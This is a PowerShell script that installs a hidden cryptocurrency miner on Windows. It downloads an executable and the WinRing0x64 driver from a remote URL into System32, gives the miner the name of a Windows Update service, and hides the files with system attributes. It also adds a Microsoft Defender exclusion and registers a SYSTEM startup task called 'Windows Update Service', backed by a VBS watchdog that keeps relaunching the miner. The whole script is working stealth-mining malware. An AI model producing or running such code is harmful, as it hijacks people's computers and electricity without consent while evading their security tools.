# Check admin privileges
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "Run with admin rights"; exit
}

# Define paths
$sysDir = "$env:SystemRoot\System32"
$urls = @{
    "wuaserv.exe" = "https://github.com/username/repo/raw/main/wuaserv.exe"
    "WinRing0x64.sys" = "https://github.com/username/repo/raw/main/WinRing0x64.sys"
}

# Clean old files
$oldFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys", "$sysDir\slmgr2.vbs")
foreach ($file in $oldFiles) {
    if (Test-Path $file) {
        attrib -h -s "$file" | Out-Null
        Remove-Item -Path $file -Force
    }
}

# Remove old task
Get-ScheduledTask -TaskName "Windows Update Service" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false

# User input
$pool = Read-Host "Enter pool address (e.g., pool.minexmr.com:443)"
$wallet = Read-Host "Enter wallet address"
$pass = Read-Host "Enter pool password"
$threads = Read-Host "Enter thread count"

# Download files
foreach ($file in $urls.Keys) {
    try {
        $outputPath = "$sysDir\$file"
        Invoke-WebRequest -Uri $urls[$file] -OutFile $outputPath -ErrorAction Stop
    } catch {
        Write-Error "Download failed: $_"; exit
    }
}

# Verify required files exist
$requiredFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys")
foreach ($file in $requiredFiles) {
    if (-not (Test-Path $file)) {
        Write-Error "Missing required file: $file"; exit
    }
}

# Create VBS file
$vbsTemplate = @'
Option Explicit
Dim scriptFullPath, scriptDir, objWMIService, colProcesses, objProcess, strComputer
Dim objShell, strProcessName, strAppPath, processMap, processKey, blnProcessFound
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set objShell = CreateObject("WScript.Shell")
Set processMap = CreateObject("Scripting.Dictionary")
processMap.Add "wuaserv.exe", "{appPath} -o {pool} -u {wallet} -p {pass} -t {threads}"
Do While True
    For Each processKey In processMap.Keys
        strProcessName = processKey
        strAppPath = processMap.Item(processKey)
        blnProcessFound = False
        Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & strProcessName & "'")
        For Each objProcess in colProcesses
            blnProcessFound = True
        Next
        If blnProcessFound = False Then
            objShell.Run strAppPath
        End If
    Next
    WScript.Sleep 1055
Loop
'@

$vbsContent = $vbsTemplate `
    -replace "{pool}", $pool `
    -replace "{wallet}", $wallet `
    -replace "{pass}", $pass `
    -replace "{threads}", $threads `
    -replace "{appPath}", "$sysDir\wuaserv.exe"

Out-File -FilePath "$sysDir\slmgr2.vbs" -InputObject $vbsContent -Encoding ASCII

# Apply hidden/system attributes
$hiddenFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys", "$sysDir\slmgr2.vbs")
foreach ($file in $hiddenFiles) {
    attrib +h +s "$file" | Out-Null
}

# Add Defender exclusion for wuaserv.exe only
Add-MpPreference -ExclusionPath "$sysDir\wuaserv.exe" -ErrorAction SilentlyContinue

# Create scheduled task
$action = New-ScheduledTaskAction -Execute "$sysDir\wscript.exe" -Argument "$sysDir\slmgr2.vbs"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 9999
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings

# Register task without TaskPath
try {
    Register-ScheduledTask -TaskName "Windows Update Service" -InputObject $task -ErrorAction Stop
    Write-Host "Task registered successfully"
} catch {
    Write-Error "Task registration failed: $_"; exit
}

# Verify task exists
if (-not (Get-ScheduledTask -TaskName "Windows Update Service" -ErrorAction SilentlyContinue)) {
    Write-Error "Failed to verify task registration"; exit
}

# Start task after delay
Start-Sleep -Seconds 5
try {
    Start-ScheduledTask -TaskName "Windows Update Service" -ErrorAction Stop
    Write-Host "Task started successfully!"
} catch {
    Write-Error "Failed to start task: $_"
}
